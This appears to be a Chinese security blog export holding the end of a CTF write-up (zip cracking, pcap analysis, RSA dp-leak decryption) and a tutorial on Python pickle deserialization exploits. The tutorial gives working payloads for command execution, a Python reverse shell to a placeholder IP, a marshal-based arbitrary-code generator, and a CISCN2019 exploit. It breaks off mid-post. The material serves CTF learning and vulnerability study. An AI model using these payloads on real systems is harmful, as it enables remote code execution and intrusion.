<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">小明喜欢用自己的手机号来加密zip，我们通过社工只查到了他手机号的前三位为<span class="number">199</span>，你能解开这个压缩包吗？<span class="comment">(手机号为伪造手机号，请不要试图拨打或社工)</span></span><br></pre></td></tr></table></figure>
<p>于是爆破199开头的手机号，得到密码：19950453796<br><img src="/2019/11/25/LHB-Writeup/20191122200459667.png" alt="在这里插入图片描述"></p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>第一层解压后得到一个压缩包和一个Readme.txt，内容不重要，但是看到level2.zip里面也有一个Readme.txt，所以尝试明文攻击，成功恢复密钥并解压：<br><img src="/2019/11/25/LHB-Writeup/20191122200717183.png" alt="在这里插入图片描述"></p>
<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>第二层解压后，只给了一个压缩包，于是尝试伪加密：<br><img src="/2019/11/25/LHB-Writeup/20191122200956572.png" alt="在这里插入图片描述"><br>将箭头位置修该为0，成功解压，得到下面这张图片：<br><img src="/2019/11/25/LHB-Writeup/20191122201051790.png" alt="在这里插入图片描述"><br>然后修改发图片高度：<br><img src="/2019/11/25/LHB-Writeup/20191122201106882.png" alt="在这里插入图片描述"></p>
<p>得到flag：flag{4537ec3bd52ba2b41c4a780db841efc3ddccc4a4}<br><img src="/2019/11/25/LHB-Writeup/20191122201150405.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="数据包分析-Easy"><a href="#数据包分析-Easy" class="headerlink" title="数据包分析-Easy"></a>数据包分析-Easy</h1><p>题目给了一个http3.pcap，进行流量分析，根据题目描述，直接导出HTTP对象列表，发现flag.php:<br><img src="/2019/11/25/LHB-Writeup/20191122201347715.png" alt="在这里插入图片描述"></p>
<p>导出后，即可在里面看到flag：flag{3eyufhnj87}<br><img src="/2019/11/25/LHB-Writeup/20191122201438522.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h1><p>题目给了加密脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse</span><br><span class="line">flag = <span class="string">'flag&#123;a-z0-9&#125;'</span></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">p = getPrime(nbits / <span class="number">2</span>)</span><br><span class="line">q = getPrime(nbits / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> p != q</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phiN)</span><br><span class="line">phint = d % (p - <span class="number">1</span>)</span><br><span class="line">qhint = q % (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(e) + <span class="string">'\n'</span>)</span><br><span class="line">    f.write(str(N) + <span class="string">'\n'</span>)</span><br><span class="line">    f.write(str(phint) + <span class="string">'\n'</span>)</span><br><span class="line">    f.write(str(qhint) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plain = str2int(flag)</span><br><span class="line"></span><br><span class="line">c = pow(plain, e, N)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cipher.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex(c))</span><br></pre></td></tr></table></figure></p>
<p>但实际上没什么用，只是告诉了我们pubkey.txt里面分别对应的内容，即：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attr">N</span> = <span class="number"></span></span><br><span class="line"><span class="attr">phint</span> = <span class="number"></span></span><br><span class="line"><span class="attr">qhint</span> = <span class="number"></span></span><br></pre></td></tr></table></figure>
<p>而这里的phint和qhint实际上就是常说的dp和dq。</p>
<p>还给了密文如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="number"></span>c835b1ee9L</span><br></pre></td></tr></table></figure>
<p>所以这题我们有c、e、n、dp、dq，足够解出明文了。</p>
<p>参考这篇文章：<a href="https://skysec.top/2018/08/24/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF(1)/" target="_blank" rel="noopener">https://skysec.top/2018/08/24/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF(1)/</a></p>
<p>最终解密脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number"></span></span><br><span class="line">dp = <span class="number"></span></span><br><span class="line">c = <span class="string">""</span></span><br><span class="line">c = int(c[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            <span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure></p>
<p>运行得到flag：flag{6b85823e6f121a7bb3407ff2e9f5f2f27efcc5a6}</p>
<p><img src="/2019/11/25/LHB-Writeup/20191122202145663.png" alt="在这里插入图片描述"> </p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈python反序列化漏洞</title>
    <url>/2019/11/19/Python-unserialize-vulnerability/</url>
    <content><![CDATA[<h1 id="0x01-序列化与反序列化"><a href="#0x01-序列化与反序列化" class="headerlink" title="0x01 序列化与反序列化"></a>0x01 序列化与反序列化</h1><p>Python中的序列化操作是通过<code>pickle</code>和 <code>cPickle</code> 模块（操作是一样的，这里以pickle为例）：</p>
<p>1、<code>dump</code>和<code>load</code>与文件操作结合起来：</p>
<p>（1）序列化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>,)</span><br></pre></td></tr></table></figure>
<p>必填参数<code>obj</code>表示将要封装的对象，必填参数<code>file</code>表示<code>obj</code>要写入的文件对象，<code>file</code>必须以二进制可写模式打开，即<code>wb</code>。</p>
<p>（2）反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file,*,fix_imports=<span class="literal">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span></span><br></pre></td></tr></table></figure>
<p>必填参数<code>file</code>必须以二进制可读模式打开，即<code>rb</code>，其他都为可选参数。</p>
<p>（3）示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = [<span class="string">'aa'</span>, <span class="string">'bb'</span>, <span class="string">'cc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./test.pkl"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./test.pkl"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> ff:</span><br><span class="line">    d = pickle.load(ff)</span><br><span class="line"></span><br><span class="line">print(d)</span><br><span class="line"><span class="comment"># ['aa', 'bb', 'cc']</span></span><br></pre></td></tr></table></figure>
<p>2、<code>dumps</code>与<code>loads</code>则不需要输出成文件，而是以字符串(py2)或字节流(py3)的形式进行转换。</p>
<p>（1）序列化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dumps(obj)</span><br></pre></td></tr></table></figure>
<p>（2）反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(bytes_object)</span><br></pre></td></tr></table></figure>
<p>（3）示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = [<span class="string">'aa'</span>, <span class="string">'bb'</span>, <span class="string">'cc'</span>]</span><br><span class="line">p = pickle.dumps(data)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">d = pickle.loads(p)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
<p>output：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">b'\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">03</span>]q\<span class="keyword">x</span><span class="number">00</span>(X\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>aaq\<span class="keyword">x</span><span class="number">01</span>X\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>bbq\<span class="keyword">x</span><span class="number">02</span>X\<span class="keyword">x</span><span class="number">02</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>ccq\<span class="keyword">x</span><span class="number">03</span>e.'  </span><br><span class="line"></span><br><span class="line">['aa', 'bb', '<span class="keyword">cc</span>']</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = [<span class="string">'aa'</span>, <span class="string">'bb'</span>, <span class="string">'cc'</span>]</span><br><span class="line">p = pickle.dumps(data)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line">d = pickle.loads(p)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure>
<p>output：</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name">lp0</span></span><br><span class="line">S<span class="symbol">'aa</span>'</span><br><span class="line">p1</span><br><span class="line">aS<span class="symbol">'bb</span>'</span><br><span class="line">p2</span><br><span class="line">aS<span class="symbol">'cc</span>'</span><br><span class="line">p3</span><br><span class="line">a.</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'aa</span>', <span class="symbol">'bb</span>', <span class="symbol">'cc</span>']</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="0x02-PVM-操作码"><a href="#0x02-PVM-操作码" class="headerlink" title="0x02 PVM 操作码"></a>0x02 PVM 操作码</h1><p>要想真正的利用反序列化，我们还得从底层了解一下pickle数据的格式是什么样的。</p>
<ul>
<li><code>c</code>：读取新的一行作为模块名<code>module</code>，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</li>
<li><code>(</code>：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与<code>t</code>搭配使用，以产生一个元组。</li>
<li><code>t</code>：从堆栈中弹出对象，直到一个<code>(</code>被弹出，并创建一个包含弹出对象（除了<code>(</code>）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</li>
<li><code>S</code>：读取引号中的字符串直到换行符处，然后将它压入堆栈。</li>
<li><code>R</code>：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</li>
<li><code>.</code>：结束pickle</li>
</ul>
<p>简单说来就是：</p>
<ul>
<li><code>c</code>：以c开始的后面两行的作用类似<code>os.system</code>的调用，其中<code>cos</code>在第一行，<code>system</code>在第二行。</li>
<li><code>(</code>：相当于左括号</li>
<li><code>t</code>：相当于右括号</li>
<li><code>S</code>：表示本行的内容一个字符串</li>
<li><code>R</code>：执行紧靠自己左边的一个括号对（即<code>(</code> 和<code>t</code>之间）的内容</li>
<li><code>.</code>：代表该pickle结束</li>
</ul>
<p>举一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'whoami'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
<p>我们将上面的序列化字符串在python2下反序列化，相当于执行了<code>os.system(&#39;whoami&#39;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">s =<span class="string">"cos\nsystem\n(S'whoami'\ntR."</span></span><br><span class="line">pickle.loads(s)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/19/Python-unserialize-vulnerability/2019111919425656.png" alt="在这里插入图片描述"></p>
<hr>
<h1 id="0x03-反序列化漏洞利用"><a href="#0x03-反序列化漏洞利用" class="headerlink" title="0x03 反序列化漏洞利用"></a>0x03 反序列化漏洞利用</h1><p>1、可能出现的地方：</p>
<ul>
<li>通常在解析认证token，session的时候。现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</li>
<li>可能将对象Pickle后存储成磁盘文件。</li>
<li>可能将对象Pickle后在网络中传输。</li>
<li>可能参数传递给程序，比如<a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/" target="_blank" rel="noopener">sqlmap的代码执行漏洞</a></li>
</ul>
<p>2、利用方式</p>
<p>python中的类有一个<code>__reduce__</code>方法，类似与PHP中的<code>wakeup</code>，在反序列化的时候会自动调用。</p>
<p>这里注意，在python2中只有内置类才有<code>__reduce__</code>方法，即用<code>class A(object)</code>声明的类，而python3中已经默认都是内置类了，具体可参考<a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">这篇文章</a></p>
<p>而我们定义的<code>__reduce__</code>可以返回一个元组，这个元组包含2到5个元素，主要用到前两个参数，即一个可调用的对象，用于重建对象时调用，一个参数元素（也是元组形式），供那个可调用对象使用。</p>
<p>举个例子就清楚了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure>
<p>可以看到成功执行了命令：<br><img src="/2019/11/19/Python-unserialize-vulnerability/20191119201217782.png" alt="在这里插入图片描述"></p>
<p>我们再试一下反弹shell，在ubuntu上运行下列代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        shell = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))    </span><br><span class="line">a=A()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></table></figure>
<p>在kali上监听8888端口，可以看到成功反弹shell。<br><img src="/2019/11/19/Python-unserialize-vulnerability/20191119202422865.png" alt="在这里插入图片描述"></p>
<p><code>pickle.loads</code>是会解决import 问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, <span class="selector-tag">input</span>,</span><br><span class="line">os<span class="selector-class">.system</span>, os<span class="selector-class">.popen</span>, os<span class="selector-class">.popen2</span>, os<span class="selector-class">.popen3</span>, os<span class="selector-class">.popen4</span>, os<span class="selector-class">.open</span>, os<span class="selector-class">.pipe</span>,</span><br><span class="line">os<span class="selector-class">.listdir</span>, os<span class="selector-class">.access</span>,</span><br><span class="line">os<span class="selector-class">.execl</span>, os<span class="selector-class">.execle</span>, os<span class="selector-class">.execlp</span>, os<span class="selector-class">.execlpe</span>, os<span class="selector-class">.execv</span>,</span><br><span class="line">os<span class="selector-class">.execve</span>, os<span class="selector-class">.execvp</span>, os<span class="selector-class">.execvpe</span>, os<span class="selector-class">.spawnl</span>, os<span class="selector-class">.spawnle</span>, os<span class="selector-class">.spawnlp</span>, os<span class="selector-class">.spawnlpe</span>,</span><br><span class="line">os<span class="selector-class">.spawnv</span>, os<span class="selector-class">.spawnve</span>, os<span class="selector-class">.spawnvp</span>, os<span class="selector-class">.spawnvpe</span>,</span><br><span class="line">pickle<span class="selector-class">.load</span>, pickle<span class="selector-class">.loads</span>,cPickle<span class="selector-class">.load</span>,cPickle<span class="selector-class">.loads</span>,</span><br><span class="line">subprocess<span class="selector-class">.call</span>,subprocess<span class="selector-class">.check_call</span>,subprocess<span class="selector-class">.check_output</span>,subprocess<span class="selector-class">.Popen</span>,</span><br><span class="line">commands<span class="selector-class">.getstatusoutput</span>,commands<span class="selector-class">.getoutput</span>,commands<span class="selector-class">.getstatus</span>,</span><br><span class="line">glob<span class="selector-class">.glob</span>,</span><br><span class="line">linecache<span class="selector-class">.getline</span>,</span><br><span class="line">shutil<span class="selector-class">.copyfileobj</span>,shutil<span class="selector-class">.copyfile</span>,shutil<span class="selector-class">.copy</span>,shutil<span class="selector-class">.copy2</span>,shutil<span class="selector-class">.move</span>,shutil<span class="selector-class">.make_archive</span>,</span><br><span class="line">dircache<span class="selector-class">.listdir</span>,dircache<span class="selector-class">.opendir</span>,</span><br><span class="line">io<span class="selector-class">.open</span>,</span><br><span class="line">popen2<span class="selector-class">.popen2</span>,popen2<span class="selector-class">.popen3</span>,popen2<span class="selector-class">.popen4</span>,</span><br><span class="line">timeit<span class="selector-class">.timeit</span>,timeit<span class="selector-class">.repeat</span>,</span><br><span class="line">sys<span class="selector-class">.call_tracing</span>,</span><br><span class="line"><span class="selector-tag">code</span><span class="selector-class">.interact</span>,<span class="selector-tag">code</span><span class="selector-class">.compile_command</span>,codeop<span class="selector-class">.compile_command</span>,</span><br><span class="line">pty<span class="selector-class">.spawn</span>,</span><br><span class="line">posixfile<span class="selector-class">.open</span>,posixfile<span class="selector-class">.fileopen</span>,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="0x04-任意代码执行"><a href="#0x04-任意代码执行" class="headerlink" title="0x04 任意代码执行"></a>0x04 任意代码执行</h1><p>pickle 是不能序列化代码对象的，但是自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块<code>Marshal</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">code_pickle = base64.b64encode(marshal.dumps(code.func_code))</span><br><span class="line"><span class="keyword">print</span> code_pickle</span><br></pre></td></tr></table></figure>
<p>输出如下：<br><img src="/2019/11/19/Python-unserialize-vulnerability/20191119203523675.png" alt="在这里插入图片描述"><br>为了保证格式问题采用base64编码一下，但是我们并不能像前面那样利用<code>__reduce__</code>来调用，因为<code>__reduce__</code>是利用调用某个可调用对象(callable) 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数。</p>
<p>这时候就需要利用PVM操作码来进行构造了，想要这段输出的base64的内容得到执行，我们需要如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), <span class="string">''</span>))()</span><br></pre></td></tr></table></figure>
<p>Python 能通过 <code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code> 来动态地创建匿名函数，所以上面的语句实际上就是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code_str = base64.b64decode(code_enc)</span><br><span class="line">code = marshal.loads(code_str)</span><br><span class="line">func = types.FunctionType(code, globals(), <span class="string">''</span>)</span><br><span class="line">func()</span><br></pre></td></tr></table></figure>
<p>最终上面的例子构造出来的PVM语句如下：<br><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(<span class="name">cmarshal</span></span><br><span class="line">loads</span><br><span class="line">(<span class="name">cbase64</span></span><br><span class="line">b64decode</span><br><span class="line">(<span class="name">S</span>'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////90BgAAAHdob2FtaSgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAQAAACgAAAAAKAAAAABzCQAAAC5cdGVzdC5weXQEAAAAY29kZQUAAABzBAAAAAABDAE='</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>''</span><br><span class="line">tR(<span class="name">tR</span>.</span><br></pre></td></tr></table></figure></p>
<p>我们将他反序列化一下看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">s =<span class="string">"""ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////90BgAAAHdob2FtaSgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAQAAACgAAAAAKAAAAABzCQAAAC5cdGVzdC5weXQEAAAAY29kZQUAAABzBAAAAAABDAE='</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS''</span></span><br><span class="line"><span class="string">tR(tR.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">pickle.loads(s)</span><br></pre></td></tr></table></figure>
<p>发现成功执行了<code>code</code>函数里的语句：<br><img src="/2019/11/19/Python-unserialize-vulnerability/20191119204618974.png" alt="在这里插入图片描述"></p>
<p>这样我们可以用如下脚本构造payload，再根据实际情况对payload进行url编码之类的操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># any code here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S'%s'</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS''</span></span><br><span class="line"><span class="string">tR(tR."""</span> % base64.b64encode(marshal.dumps(code.func_code))</span><br></pre></td></tr></table></figure>
<h1 id="0x05-实例分析"><a href="#0x05-实例分析" class="headerlink" title="0x05 实例分析"></a>0x05 实例分析</h1><h4 id="CISCN2019-ikun"><a href="#CISCN2019-ikun" class="headerlink" title="CISCN2019 ikun"></a>CISCN2019 ikun</h4><p>这题先通过逻辑漏洞修改表单的折扣来购买lv6产品，然后伪造JWT为admin拿到源码，我们直接来讲python反序列化的地方。</p>
<p>审计一下源码，使用的tornado框架，问题在<code>views/Admin.py</code>中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到在<code>post</code>方法中，使用<code>become</code>传参进去，并且对传进来的值进行<code>url</code>解码，然后反序列化，反序列化的结果通过<code>p</code>在前端回显了。</p>
<p>这里就存在一个反序列化漏洞，但是这题过滤了很多执行系统命令的函数，我看网上大多数的wp直接猜出<code>/flag.txt</code>然后用<code>eval(open(&#39;/flag.txt&#39;,&#39;r&#39;).read())</code>来读取文件了。</p>
<p>实际上这里可以使用<code>commands.getoutput()</code>来执行命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">'ls /'</span>,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="keyword">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ccommands</span><span class="number">%0</span>Agetoutput<span class="number">%0</span>Ap0<span class="number">%0</span>A<span class="number">%28</span>S<span class="number">%27</span>ls<span class="number">%20</span>/<span class="number">%27</span><span class="number">%0</span>Ap1<span class="number">%0</span>Atp2<span class="number">%0</span>ARp3<span class="number">%0</span>A.</span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/19/Python-unserialize-vulnerability/20191119210651587.png" alt="在这里插入图片描述"></p>
<p>再将上面脚本的<code>ls /</code>改为<code>cat /flag.txt</code>，得到最终payload：</p>
